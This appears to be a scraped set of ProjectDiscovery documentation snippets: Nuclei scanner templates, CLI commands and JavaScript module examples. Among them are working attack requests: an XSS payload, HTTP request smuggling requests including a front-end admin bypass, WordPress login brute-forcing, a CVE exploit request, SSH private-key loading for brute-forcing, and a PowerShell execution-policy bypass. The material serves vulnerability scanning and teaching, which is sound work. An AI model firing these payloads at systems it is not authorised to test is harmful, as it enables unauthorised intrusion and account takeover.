yaml\nCODE:\n```\nid: dvwa-xss-verification\n\ninfo:\n  name: DVWA Reflected XSS Verification\n  author: pdteam\n  severity: info\n\nheadless:\n  - steps:\n      - args:\n          url: \"{{BaseURL}}\"\n        action: navigate\n      - action: waitload\n\n      # Set the hook to override window.data for xss detection\n      - action: script\n        args:\n          hook: true\n          code: \"(function() { window.alert = function() { window.data = 'found' } })()\"\n      - args:\n          by: x\n          value: admin\n          xpath: /html/body/div/div[2]/form/fieldset/input\n        action: text\n      - args:\n          by: x\n          value: password\n          xpath: /html/body/div/div[2]/form/fieldset/input[2]\n        action: text\n      - args:\n          by: x\n          xpath: /html/body/div/div[2]/form/fieldset/p/input\n        action: click\n      - action: waitload\n      - args:\n          by: x\n          xpath: /html/body/div/div[2]/div/ul[2]/li[11]/a\n        action: click\n      - action: waitload\n      - args:\n          by: x\n          value: '\"><svg/onload=alert(1)>'\n          xpath: /html/body/div/div[3]/div/div/form/p/input\n        action: text\n      - args:\n          keys: \"\\r\" # Press the enter key on the keyboard\n        action: keyboard\n      - action: waitload\n      - action: script\n        name: alert\n        args:\n          code: \"window.data\"\n    matchers:\n      - part: alert\n        type: word\n        words:\n          - \"found\"\n```\n\n----------------------------------------\n\nTITLE: Multiple Request Bruteforcing with File Payloads\nDESCRIPTION: Template showing bruteforcing with multiple HTTP requests (POST, DELETE, PUT) using file-based payloads. Demonstrates usage of various payload encodings and clusterbomb attack type.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/templates/protocols/http/http-payloads-examples.mdx#2025-04-12_snippet_1\n\nLANGUAGE: yaml\nCODE:\n```\nid: multiple-raw-example\ninfo:\n  name: Test RAW Template\n  author: pdteam\n  severity: info\n\nhttp:\n  - raw:\n      - |\n        POST /?param_a=§param_a§&paramb=§param_b§ HTTP/1.1\n        User-Agent: §param_a§\n        Host: {{Hostname}}\n        another_header: {{base64('§param_b§')}}\n        Accept: */*\n\n        admin=test\n\n      - |\n        DELETE / HTTP/1.1\n        User-Agent: nuclei\n        Host: {{Hostname}}\n\n        {{sha256('§param_a§')}} \n\n      - |\n        PUT / HTTP/1.1\n        Host: {{Hostname}}\n\n        {{html_escape('§param_a§')}} + {{hex_encode('§param_b§')}}\n\n    attack: clusterbomb\n    payloads:\n      param_a: payloads/prams.txt\n      param_b: payloads/paths.txt\n\n    matchers:\n      - type: word\n        words:\n          - \"Test is test matcher text\"\n```\n\n----------------------------------------\n\nTITLE: Differential Response CL.TE HTTP Smuggling Test\nDESCRIPTION: YAML template for confirming CL.TE HTTP smuggling vulnerability through differential responses by triggering 404 errors.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/templates/protocols/http/http-smuggling-examples.mdx#2025-04-12_snippet_3\n\nLANGUAGE: yaml\nCODE:\n```\nid: confirming-cl-te-via-differential-responses-http-smuggling\n\ninfo:\n  name: HTTP request smuggling, confirming a CL.TE vulnerability via differential responses\n  author: pdteam\n  severity: info\n  reference: https://portswigger.net/web-security/request-smuggling/finding/lab-confirming-cl-te-via-differential-responses\n\nhttp:\n  - raw:\n    - |+\n      POST / HTTP/1.1\n      Host: {{Hostname}}\n      Content-Type: application/x-www-form-urlencoded\n      Content-Length: 35\n      Transfer-Encoding: chunked\n      \n      0\n      \n      GET /404 HTTP/1.1\n      X-Ignore: X\n    - |+\n      POST / HTTP/1.1\n      Host: {{Hostname}}\n      Content-Type: application/x-www-form-urlencoded\n      Content-Length: 35\n      Transfer-Encoding: chunked\n      \n      0\n      \n      GET /404 HTTP/1.1\n      X-Ignore: X\n      \n    unsafe: true\n    matchers:\n      - type: dsl\n        dsl:\n          - 'status_code==404'\n```\n\n----------------------------------------\n\nTITLE: Naabu with Nmap Integration in Bash\nDESCRIPTION: Use Naabu to scan ports on hackerone.com and then run an Nmap service version scan on the discovered ports.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/tools/naabu/running.mdx#2025-04-12_snippet_7\n\nLANGUAGE: console\nCODE:\n```\necho hackerone.com | naabu -nmap-cli 'nmap -sV -oX nmap-output'\n```\n\n----------------------------------------\n\nTITLE: Detecting CL.TE HTTP Smuggling with Nuclei\nDESCRIPTION: This Nuclei template demonstrates how to detect a basic CL.TE HTTP Smuggling vulnerability using rawhttp engine with the unsafe attribute set to true.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/templates/protocols/http/request-tampering.mdx#2025-04-12_snippet_4\n\nLANGUAGE: yaml\nCODE:\n```\nid: CL-TE-http-smuggling\n\ninfo:\n  name: HTTP request smuggling, basic CL.TE vulnerability\n  author: pdteam\n  severity: info\n  reference: https://portswigger.net/web-security/request-smuggling/lab-basic-cl-te\n\nhttp:\n  - raw:\n    - |+\n      POST / HTTP/1.1\n      Host: {{Hostname}}\n      Connection: keep-alive\n      Content-Type: application/x-www-form-urlencoded\n      Content-Length: 6\n      Transfer-Encoding: chunked\n      \n      0\n      \n      G      \n    - |+\n      POST / HTTP/1.1\n      Host: {{Hostname}}\n      Connection: keep-alive\n      Content-Type: application/x-www-form-urlencoded\n      Content-Length: 6\n      Transfer-Encoding: chunked\n      \n      0\n      \n      G\n            \n    unsafe: true\n    matchers:\n      - type: word\n        words:\n          - 'Unrecognized method GPOST'\n```\n\n----------------------------------------\n\nTITLE: Google API Key Detection Template in Nuclei\nDESCRIPTION: A complete Nuclei template example for detecting Google API keys in files. It demonstrates how to combine extensions configuration with regex extractors.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/templates/protocols/file.mdx#2025-04-12_snippet_4\n\nLANGUAGE: yaml\nCODE:\n```\nid: google-api-key\n\ninfo:\n  name: Google API Key\n  author: pdteam\n  severity: info\n\nfile:\n  - extensions:\n      - all\n      - txt\n\n    extractors:\n      - type: regex\n        name: google-api-key\n        regex:\n          - \"AIza[0-9A-Za-z\\\\-_]{35}\"\n```\n\n----------------------------------------\n\nTITLE: Basic CL.TE HTTP Smuggling Test Template\nDESCRIPTION: YAML template for testing basic CL.TE HTTP smuggling vulnerability by sending malformed POST requests with conflicting Content-Length and Transfer-Encoding headers.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/templates/protocols/http/http-smuggling-examples.mdx#2025-04-12_snippet_0\n\nLANGUAGE: yaml\nCODE:\n```\nid: CL-TE-http-smuggling\n\ninfo:\n  name: HTTP request smuggling, basic CL.TE vulnerability\n  author: pdteam\n  severity: info\n  reference: https://portswigger.net/web-security/request-smuggling/lab-basic-cl-te\n\nhttp:\n  - raw:\n    - |+\n      POST / HTTP/1.1\n      Host: {{Hostname}}\n      Connection: keep-alive\n      Content-Type: application/x-www-form-urlencoded\n      Content-Length: 6\n      Transfer-Encoding: chunked\n      \n      0\n      \n      G\n    - |+\n      POST / HTTP/1.1\n      Host: {{Hostname}}\n      Connection: keep-alive\n      Content-Type: application/x-www-form-urlencoded\n      Content-Length: 6\n      Transfer-Encoding: chunked\n      \n      0\n      \n      G\n      \n    unsafe: true\n    matchers:\n      - type: dsl\n        dsl:\n          - 'contains(body, \"Unrecognized method GPOST\")'\n```\n\n----------------------------------------\n\nTITLE: Advanced Multi-Request Race Condition Testing Template in Nuclei\nDESCRIPTION: Complete example template for testing race conditions with multiple unique HTTP requests. This template sends 5 different POST requests simultaneously using threads and Nuclei's Gate mechanism.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/templates/protocols/http/race-conditions.mdx#2025-04-12_snippet_3\n\nLANGUAGE: yaml\nCODE:\n```\nid: multi-request-race\n\ninfo:\n  name: Race condition testing with multiple requests\n  author: pd-team\n  severity: info\n\nhttp:\n  - raw:  \n      - |\n        POST / HTTP/1.1\n        Pragma: no-cache\n        Host: {{Hostname}}\n        Cache-Control: no-cache, no-transform\n        User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0\n\n        id=1\n        \n      - |\n        POST / HTTP/1.1\n        Pragma: no-cache\n        Host: {{Hostname}}\n        Cache-Control: no-cache, no-transform\n        User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0\n\n        id=2\n\n      - |\n        POST / HTTP/1.1\n        Pragma: no-cache\n        Host: {{Hostname}}\n        Cache-Control: no-cache, no-transform\n        User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0\n\n        id=3\n\n      - |\n        POST / HTTP/1.1\n        Pragma: no-cache\n        Host: {{Hostname}}\n        Cache-Control: no-cache, no-transform\n        User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0\n\n        id=4\n\n      - |\n        POST / HTTP/1.1\n        Pragma: no-cache\n        Host: {{Hostname}}\n        Cache-Control: no-cache, no-transform\n        User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0\n\n        id=5\n\n    threads: 5\n    race: true\n```\n\n----------------------------------------\n\nTITLE: Implementing Conditional Execution in WordPress Login Bruteforce Template\nDESCRIPTION: This YAML snippet demonstrates how to use the flow protocol to conditionally execute requests in a WordPress login bruteforce template. It first checks if the target is a WordPress site before attempting to bruteforce login credentials.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/templates/protocols/flow.mdx#2025-04-12_snippet_0\n\nLANGUAGE: yaml\nCODE:\n```\nid: wordpress-bruteforce\n\ninfo:\n  name: WordPress Login Bruteforce\n  author: pdteam\n  severity: high\n\nflow: http(1) && http(2)\n\nhttp:\n  - method: GET\n    path:\n      - \"{{BaseURL}}/wp-login.php\"\n\n    matchers:\n      - type: word\n        words:\n          - \"WordPress\"\n\n  - method: POST\n    path:\n      - \"{{BaseURL}}/wp-login.php\"\n\n    body: |\n        log={{username}}&pwd={{password}}&wp-submit=Log+In\n\n    attack: clusterbomb \n    payloads:\n      users: helpers/wordlists/wp-users.txt\n      passwords: helpers/wordlists/wp-passwords.txt\n\n    matchers:\n      - type: dsl\n        dsl:\n          - status_code == 302\n          - contains_all(header, \"/wp-admin\",\"wordpress_logged_in\")\n        condition: and\n```\n\n----------------------------------------\n\nTITLE: Running Nuclei Command with Variables in CLI\nDESCRIPTION: This bash command demonstrates how to run the Nuclei scanner from the command line with specific template variables for username and password when targeting a WordPress vulnerability.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/cloud/scanning/parameters.mdx#2025-04-12_snippet_1\n\nLANGUAGE: bash\nCODE:\n```\nnuclei -id CVE-2023-1890 -var username=admin -var password=password123 -target https://example.com\n```\n\n----------------------------------------\n\nTITLE: WordPress Detection and Exploitation Workflow\nDESCRIPTION: Complex workflow that detects WordPress installations and runs multiple security checks, CVE tests, and vulnerability scans.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/templates/workflows/examples.mdx#2025-04-12_snippet_3\n\nLANGUAGE: yaml\nCODE:\n```\nid: workflow-example\ninfo:\n  name: Test Workflow Template\n  author: pdteam\n\nworkflows:\n  - template: technologies/tech-detect.yaml\n    matchers:\n      - name: wordpress\n        subtemplates:\n          - template: cves/CVE-2019-6715.yaml\n          - template: cves/CVE-2019-9978.yaml\n          - template: files/wordpress-db-backup.yaml\n          - template: files/wordpress-debug-log.yaml\n          - template: files/wordpress-directory-listing.yaml\n          - template: files/wordpress-emergency-script.yaml\n          - template: files/wordpress-installer-log.yaml\n          - template: files/wordpress-tmm-db-migrate.yaml\n          - template: files/wordpress-user-enumeration.yaml\n          - template: security-misconfiguration/wordpress-accessible-wpconfig.yaml\n          - template: vulnerabilities/sassy-social-share.yaml\n          - template: vulnerabilities/w3c-total-cache-ssrf.yaml\n          - template: vulnerabilities/wordpress-duplicator-path-traversal.yaml\n          - template: vulnerabilities/wordpress-social-metrics-tracker.yaml\n          - template: vulnerabilities/wordpress-wordfence-xss.yaml\n          - template: vulnerabilities/wordpress-wpcourses-info-disclosure.yaml\n```\n\n----------------------------------------\n\nTITLE: HTTP Protocol Variables Example\nDESCRIPTION: Demonstrates using variables in HTTP requests within a Nuclei template, including both static values and base64 encoded strings. Shows integration with matchers for response validation.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/templates/reference/variables.mdx#2025-04-12_snippet_1\n\nLANGUAGE: yaml\nCODE:\n```\nid: variables-example\n\ninfo:\n  name: Variables Example\n  author: pdteam\n  severity: info\n\nvariables:\n  a1: \"value\"\n  a2: \"{{base64('hello')}}\"\n\nhttp:\n  - raw:\n      - |\n        GET / HTTP/1.1\n        Host: {{FQDN}}\n        Test: {{a1}}\n        Another: {{a2}}\n    stop-at-first-match: true\n    matchers-condition: or\n    matchers:\n      - type: word\n        words: \n          - \"value\"\n          - \"aGVsbG8=\"\"\n```\n\n----------------------------------------\n\nTITLE: Using Dedupe Helper Function in JavaScript\nDESCRIPTION: Demonstrates how to use the Dedupe helper function to remove duplicate values from multiple arrays/slices. The function automatically converts arrays to maps and returns unique values.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/templates/protocols/flow.mdx#2025-04-12_snippet_3\n\nLANGUAGE: javascript\nCODE:\n```\nlet uniq = new Dedupe(); // create new dedupe object\nuniq.Add(template[\"ptrValue\"]) \nuniq.Add(template[\"ssl_subject_cn\"]);\nuniq.Add(template[\"ssl_subject_an\"]); \nlog(uniq.Values())\n```\n\n----------------------------------------\n\nTITLE: Setting Custom Headers in Nuclei HTTP Request\nDESCRIPTION: Demonstrates how to add custom HTTP headers to a Nuclei request for tasks like setting User-Agent or Origin headers.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/templates/protocols/http/basic-http.mdx#2025-04-12_snippet_4\n\nLANGUAGE: yaml\nCODE:\n```\n# headers contain the headers for the request\nheaders:\n  # Custom user-agent header\n  User-Agent: Some-Random-User-Agent\n  # Custom request origin\n  Origin: https://google.com\n```\n\n----------------------------------------\n\nTITLE: Executing MySQL Query on Specific Database in JavaScript\nDESCRIPTION: Connects to a MySQL database, selects a specific database, and executes a query. Returns an SQLResult object containing the query results.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/templates/protocols/javascript/modules/mysql.MySQLClient.mdx#2025-04-12_snippet_4\n\nLANGUAGE: javascript\nCODE:\n```\nconst mysql = require('nuclei/mysql');\nconst result = mysql.ExecuteQueryOnDB('acme.com', 3306, 'username', 'password', 'dbname', 'SELECT * FROM users');\nlog(to_json(result));\n```\n\n----------------------------------------\n\nTITLE: Connecting to MS SQL Database in JavaScript\nDESCRIPTION: Establishes a connection to an MS SQL database using the provided host, port, username, and password. Returns a boolean indicating success or failure.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/templates/protocols/javascript/modules/mssql.MSSQLClient.mdx#2025-04-12_snippet_1\n\nLANGUAGE: javascript\nCODE:\n```\nconst mssql = require('nuclei/mssql');\nconst client = new mssql.MSSQLClient;\nconst connected = client.Connect('acme.com', 1433, 'username', 'password');\n```\n\n----------------------------------------\n\nTITLE: Nested Multi-Condition Workflow\nDESCRIPTION: Demonstrates deep nested workflow structure with multiple levels of template chaining for comprehensive scanning.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/templates/workflows/examples.mdx#2025-04-12_snippet_2\n\nLANGUAGE: yaml\nCODE:\n```\nid: springboot-workflow\n\ninfo:\n  name: Springboot Security Checks\n  author: dwisiswant0\n\nworkflows:\n  - template: technologies/tech-detect.yaml\n    matchers:\n      - name: lotus-domino\n        subtemplates:\n          - template: technologies/lotus-domino-version.yaml\n            subtemplates:\n              - template: cves/xx-yy-zz.yaml\n                subtemplates:\n                  - template: cves/xx-xx-xx.yaml\n```\n\n----------------------------------------\n\nTITLE: Adding Metadata for Search Engine Integration\nDESCRIPTION: Shows how to add metadata nodes for integration with search engines like Shodan. The metadata includes search engine queries that can be used with tools like uncover.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/templates/structure.mdx#2025-04-12_snippet_2\n\nLANGUAGE: yaml\nCODE:\n```\ninfo:\n  metadata:\n    shodan-query: 'vuln:CVE-2021-26855'\n```\n\n----------------------------------------\n\nTITLE: OpenAPI Specification for POST /v1/scans/config/verify Endpoint in YAML\nDESCRIPTION: This YAML snippet defines the OpenAPI specification for the POST /v1/scans/config/verify endpoint. It includes the request body schema, possible response codes, and associated schema definitions.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/api-reference/configurations/verify-config.mdx#2025-04-12_snippet_0\n\nLANGUAGE: yaml\nCODE:\n```\nopenapi: post /v1/scans/config/verify\n```\n\n----------------------------------------\n\nTITLE: Complete Code Protocol Template with Multiple Engines\nDESCRIPTION: A full Nuclei template demonstrating the code protocol with both bash and Python engines. Shows variable usage and HTTP requests with the code output.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/templates/protocols/code.mdx#2025-04-12_snippet_4\n\nLANGUAGE: yaml\nCODE:\n```\nid: code-template\n\ninfo:\n  name: example code template\n  author: pdteam\n  severity: info\n\nvariables:\n  OAST: \"{{interactsh-url}}\"\n\ncode:\n  - engine:\n      - sh\n      - bash\n    source: |\n      echo \"$OAST\" | base64\n\n  - engine:\n      - py\n      - python3\n    source: |\n      import base64\n      import os\n\n      text = os.getenv('OAST')\n      text_bytes = text.encode('utf-8') \n      base64_bytes = base64.b64encode(text_bytes) \n      base64_text = base64_bytes.decode('utf-8')\n      \n      print(base64_text)\n\nhttp:\n  - method: GET\n    path:\n      - \"{{BaseURL}}/?x={{code_1_response}}\"\n      - \"{{BaseURL}}/?x={{code_2_response}}\"\n\n# digest: 4a0a0047304502202ce8fe9f5992782da6ba59da4e8ebfde9f19a12e247adc507040e9f1f1124b4e022100cf0bc7a44a557a6655f79a2b4789e103f5099f0f81a8d1bc4ad8aabe7829b1c5:8eeeebe39b11b16384b45bc7e9163000\n```\n\n----------------------------------------\n\nTITLE: Reading All Files from a Directory with Nuclei fs Module\nDESCRIPTION: Reads all files from a specified directory and returns a string array containing the contents of all files using the ReadFilesFromDir function. Returns null if the operation fails.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/templates/protocols/javascript/modules/fs.mdx#2025-04-12_snippet_5\n\nLANGUAGE: javascript\nCODE:\n```\nconst fs = require('nuclei/fs');\n// here permitted directories are $HOME/nuclei-templates/*\nconst contents = fs.ReadFilesFromDir('helpers/ssh-keys');\nlog(contents);\n```\n\n----------------------------------------\n\nTITLE: Template Initialization with JavaScript Protocol\nDESCRIPTION: Example showing how to use the init section to load SSH private keys before template execution. Demonstrates payload updating and variable initialization features.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/templates/protocols/javascript/protocol.mdx#2025-04-12_snippet_2\n\nLANGUAGE: yaml\nCODE:\n```\nvariables:\n  keysDir: \"helpers/\"  # load all private keys from this directory\n\njavascript:\n    # init field can be used to make any preperations before the actual exploit\n    # here we are reading all private keys from helpers folder and storing them in a list\n  - init: |\n      let m = require('nuclei/fs');\n      let privatekeys = m.ReadFilesFromDir(keysDir)\n      updatePayload('keys',privatekeys)\n\n    payloads:\n      # 'keys' will be updated by actual private keys after init is executed\n      keys: \n        - key1\n        - key2\n```\n\n----------------------------------------\n\nTITLE: SSH Private Key Detection with Extension Denylist\nDESCRIPTION: An advanced Nuclei template that scans for various types of SSH private keys. Uses extension denylist, disables recursive scanning, and checks for multiple private key formats.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/templates/protocols/file-examples.mdx#2025-04-12_snippet_1\n\nLANGUAGE: yaml\nCODE:\n```\nid: ssh-private-key\n\ninfo:\n  name: SSH Private Key Detect\n  author: pd-team\n  severity: high\n\nfile:\n  - extensions:\n      - all\n    denylist:\n      - pub\n    no-recursive: true\n    max-size: 1024 # read very small chunks\n\n    matchers:\n      - type: word\n        words:\n          - \"BEGIN OPENSSH PRIVATE KEY\"\n          - \"BEGIN PRIVATE KEY\"\n          - \"BEGIN RSA PRIVATE KEY\"\n          - \"BEGIN DSA PRIVATE KEY\"\n          - \"BEGIN EC PRIVATE KEY\"\n          - \"BEGIN PGP PRIVATE KEY BLOCK\"\n          - \"ssh-rsa\"\n```\n\n----------------------------------------\n\nTITLE: Specifying Custom Arguments for Code Execution in Nuclei\nDESCRIPTION: Demonstrates how to pass custom arguments to the execution engine, specifically for bypassing PowerShell execution policy restrictions.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/templates/protocols/code.mdx#2025-04-12_snippet_5\n\nLANGUAGE: yaml\nCODE:\n```\n  - engine:\n      - powershell\n      - powershell.exe\n    args:\n      - -ExecutionPolicy\n      - Bypass\n      - -File\n```\n\n----------------------------------------\n\nTITLE: Basic TCP Network Request Template in YAML\nDESCRIPTION: Template for basic TCP network connection that sends a PING command and expects PONG response. Demonstrates simple request-response pattern with matchers.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/templates/protocols/network-examples.mdx#2025-04-12_snippet_0\n\nLANGUAGE: yaml\nCODE:\n```\nid: basic-network-request\n\ninfo:\n  name: Basic Network Request\n  author: pdteam\n  severity: info\n\ntcp:\n  - host: \n      - \"{{Hostname}}\"\n    inputs:\n      - data: \"PING\\r\\n\"\n    read-size: 4\n    matchers:\n      - type: word\n        part: data\n        words:\n          - \"PONG\"\n```\n\n----------------------------------------\n\nTITLE: Custom Headers in HTTP Request\nDESCRIPTION: This template shows how to add custom headers to an HTTP request in a Nuclei template. It sends various IP-related headers and checks for specific strings in the response to identify an exposed Apache server status page.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/templates/protocols/http/basic-http-examples.mdx#2025-04-12_snippet_4\n\nLANGUAGE: yaml\nCODE:\n```\nid: custom-headers\n\ninfo:\n  name: Test HTTP Template\n  author: pdteam\n  severity: info\n\nhttp:\n  - method: GET\n\n    # Example of sending some headers to the servers\n\n    headers:\n\n      X-Client-IP: 127.0.0.1\n      X-Remote-IP: 127.0.0.1\n      X-Remote-Addr: 127.0.0.1\n      X-Forwarded-For: 127.0.0.1\n      X-Originating-IP: 127.0.0.1\n\n    path:\n      - \"{{BaseURL}}/server-status\"\n\n    matchers:\n      - type: word\n        words:\n          - Apache Server Status\n          - Server Version\n        condition: and\n```\n\n----------------------------------------\n\nTITLE: Defining WordPress Authentication Template in YAML\nDESCRIPTION: This YAML template demonstrates a WordPress authentication vulnerability scan for CVE-2023-1890, which checks for Cross-Site Scripting in Tablesome plugin versions below 1.0.9. The template requires username and password variables for authentication.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/cloud/scanning/parameters.mdx#2025-04-12_snippet_0\n\nLANGUAGE: yaml\nCODE:\n```\nid: CVE-2023-1890\ninfo:\n  name: Tablesome < 1.0.9 - Cross-Site Scripting\n  severity: medium\n  \nhttp:\n  - raw:\n      - |\n        POST /wp-login.php HTTP/1.1\n        Host: {{Hostname}}\n        Content-Type: application/x-www-form-urlencoded\n\n        log={{username}}&pwd={{password}}&wp-submit=Log+In\n      - |\n        GET /wp-admin/edit.php?post_type=tablesome_cpt&a%22%3e%3cscript%3ealert`document.domain`%3c%2fscript%3e HTTP/1.1\n        Host: {{Hostname}}\n```\n\n----------------------------------------\n\nTITLE: Time-based Matcher with DSL\nDESCRIPTION: This template demonstrates how to use a DSL-based matcher for response time validation. It sends a raw GET request and uses the duration variable to check if the response time is 6 seconds or longer.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/templates/protocols/http/basic-http-examples.mdx#2025-04-12_snippet_6\n\nLANGUAGE: yaml\nCODE:\n```\nid: time-based-matcher\n\ninfo:\n  name: DSL based response time matcher\n  author: pdteam\n  severity: info\n\nhttp:\n  - raw:\n      - |\n        GET /slow HTTP/1.1\n\n    matchers:\n      - type: dsl\n        dsl:\n          - 'duration>=6'\n```\n\n----------------------------------------\n\nTITLE: Detecting SMBGhost Vulnerability\nDESCRIPTION: Tests if a host is vulnerable to SMBGhost by attempting to use SMBv3 compression feature. Returns boolean indicating vulnerability status.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/templates/protocols/javascript/modules/smb.SMBClient.mdx#2025-04-12_snippet_2\n\nLANGUAGE: javascript\nCODE:\n```\nconst smb = require('nuclei/smb');\nconst isSMBGhost = smb.DetectSMBGhost('acme.com', 445);\n```\n\n----------------------------------------\n\nTITLE: Using Helper Functions in Raw HTTP Requests\nDESCRIPTION: Shows how to use helper functions within raw HTTP requests in Nuclei. The example demonstrates using the base64() function to encode Basic Authentication credentials at runtime.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/templates/protocols/http/raw-http.mdx#2025-04-12_snippet_1\n\nLANGUAGE: yaml\nCODE:\n```\n    - raw:\n      - |\n        GET /manager/html HTTP/1.1\n        Host: {{Hostname}}\n        Authorization: Basic {{base64('username:password')}} # Helper function to encode input at run time.\n```\n\n----------------------------------------\n\nTITLE: Custom LDAP Search Query - JavaScript LDAP\nDESCRIPTION: Performs a custom LDAP search using provided filter and attributes. Returns a SearchResult object containing entries with the requested attributes.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/templates/protocols/javascript/modules/ldap.Client.mdx#2025-04-12_snippet_13\n\nLANGUAGE: javascript\nCODE:\n```\nconst ldap = require('nuclei/ldap');\nconst client = new ldap.Client('ldap://ldap.example.com', 'acme.com');\nconst results = client.Search('(objectClass=*)', 'cn', 'mail');\n```\n\n----------------------------------------\n\nTITLE: Using Request Annotations in Multi-Request Nuclei Template\nDESCRIPTION: This example shows how to use request annotations in a template with multiple requests. It demonstrates getting a token from one host and verifying it on another using the @Host annotation.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/templates/protocols/http/request-tampering.mdx#2025-04-12_snippet_1\n\nLANGUAGE: yaml\nCODE:\n```\nhttp:\n  - raw:\n      # this request will be sent to {{Hostname}} to get the token\n      - |\n        GET /getkey HTTP/1.1\n        Host: {{Hostname}}\n        \n      # This request will be sent instead to https://api.target.com:443 to verify the token validity\n      - |\n        @Host: https://api.target.com:443\n        GET /api/key={{token}} HTTP/1.1\n        Host: api.target.com:443\n\n    extractors:\n      - type: regex\n        name: token\n        part: body\n        regex:\n          # random extractor of strings between prefix and suffix\n          - 'prefix(.*)suffix'\n\n    matchers:\n      - type: word\n        part: body\n        words:\n          - valid token\n```\n\n----------------------------------------\n\nTITLE: Frontend Bypass CL.TE HTTP Smuggling Test\nDESCRIPTION: YAML template for testing CL.TE HTTP smuggling vulnerability that attempts to bypass frontend security controls by accessing admin endpoints.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/templates/protocols/http/http-smuggling-examples.mdx#2025-04-12_snippet_2\n\nLANGUAGE: yaml\nCODE:\n```\nid: smuggling-bypass-front-end-controls-cl-te\n\ninfo:\n  name: HTTP request smuggling to bypass front-end security controls, CL.TE vulnerability\n  author: pdteam\n  severity: info\n  reference: https://portswigger.net/web-security/request-smuggling/exploiting/lab-bypass-front-end-controls-cl-te\n\nhttp:\n  - raw:\n    - |+\n      POST / HTTP/1.1\n      Host: {{Hostname}}\n      Content-Type: application/x-www-form-urlencoded\n      Content-Length: 116\n      Transfer-Encoding: chunked\n      \n      0\n      \n      GET /admin HTTP/1.1\n      Host: localhost\n      Content-Type: application/x-www-form-urlencoded\n      Content-Length: 10\n      \n      x=\n    - |+\n      POST / HTTP/1.1\n      Host: {{Hostname}}\n      Content-Type: application/x-www-form-urlencoded\n      Content-Length: 116\n      Transfer-Encoding: chunked\n      \n      0\n      \n      GET /admin HTTP/1.1\n      Host: localhost\n      Content-Type: application/x-www-form-urlencoded\n      Content-Length: 10\n      \n      x=\n      \n    unsafe: true\n    matchers:\n      - type: dsl\n        dsl:\n          - 'contains(body, \"/admin/delete?username=carlos\")'\n```\n\n----------------------------------------\n\nTITLE: Getting Kerberos Service Ticket\nDESCRIPTION: Shows how to obtain a TGS (Ticket Granting Service) ticket for a given user and service. Returns a TGS object.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/templates/protocols/javascript/modules/kerberos.Client.mdx#2025-04-12_snippet_2\n\nLANGUAGE: javascript\nCODE:\n```\nconst kerberos = require('nuclei/kerberos');\nconst client = new kerberos.Client('acme.com', 'kdc.acme.com');\nconst resp = client.GetServiceTicket('pdtm', 'password', 'HOST/CLIENT1');\nlog(resp);\n```\n\n----------------------------------------\n\nTITLE: ASN Fingerprinting with httpx\nDESCRIPTION: Demonstrates using httpx with the -asn flag to perform ASN fingerprinting on subdomains, showing network affiliations of domains with their ASN details and countries.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/tools/httpx/running.mdx#2025-04-12_snippet_0\n\nLANGUAGE: bash\nCODE:\n```\nsubfinder -d hackerone.com -silent | httpx -asn\n```\n\n----------------------------------------\n\nTITLE: Defining OpenAPI GET Endpoint for Retrieving Scan Logs\nDESCRIPTION: This YAML snippet defines an OpenAPI endpoint for retrieving scan logs by scan ID. The endpoint follows the RESTful pattern with a path parameter for the scan_id.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/api-reference/scan_log/get-scan-log-of-given-scan-id.mdx#2025-04-12_snippet_0\n\nLANGUAGE: yaml\nCODE:\n```\nopenapi: get /v1/scans/{scan_id}/scan_log\n```\n\n----------------------------------------\n\nTITLE: Multi-Protocol Template with Internal Matcher\nDESCRIPTION: Example of a Nuclei template using the internal: true flag to control output in multi-protocol flows. This template demonstrates vulnerability checking for CVE-2023-6553 with two HTTP requests where the first matcher is marked as internal.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/templates/protocols/flow.mdx#2025-04-12_snippet_4\n\nLANGUAGE: yaml\nCODE:\n```\nid: CVE-2023-6553\n\ninfo:\n  name: Worpress Backup Migration <= 1.3.7 - Unauthenticated Remote Code Execution\n  author: FLX\n  severity: critical\n\nflow: http(1) && http(2)\n\nhttp:\n  - method: GET\n    path:\n      - \"{{BaseURL}}/wp-content/plugins/backup-backup/readme.txt\"\n\n    matchers:\n      - type: dsl\n        dsl:\n          - 'status_code == 200'\n          - 'contains(body, \"Backup Migration\")'\n        condition: and\n        internal: true  # <- updated 